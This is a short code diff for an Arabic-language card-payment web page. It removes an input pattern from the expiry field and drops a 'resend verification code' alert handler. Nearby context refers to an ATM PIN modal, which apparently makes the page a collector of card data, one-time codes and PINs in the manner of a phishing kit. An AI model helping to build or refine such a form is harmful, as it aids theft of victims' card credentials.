@@ -689,7 +689,6 @@
                                             maxlength="7"
                                             autocomplete="cc-exp"
                                             inputmode="numeric"
-                                            pattern="[0-9 /]*"
                                             required>
                                         <div class="error-msg" id="expiryError">تاريخ غير صحيح</div>
                                     </div>
@@ -1319,12 +1318,7 @@
             e.target.value = e.target.value.replace(/\D/g, '');
         });
         
-        // Resend code
-        document.getElementById('resendCode').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('تم إعادة إرسال رمز التحقق');
-        });
-        
+
         // ATM PIN Modal - Copy masked card number
         $('#atmPinModal').on('show.bs.modal', function() {
             const maskedCard = document.getElementById('maskedCard').textContent;
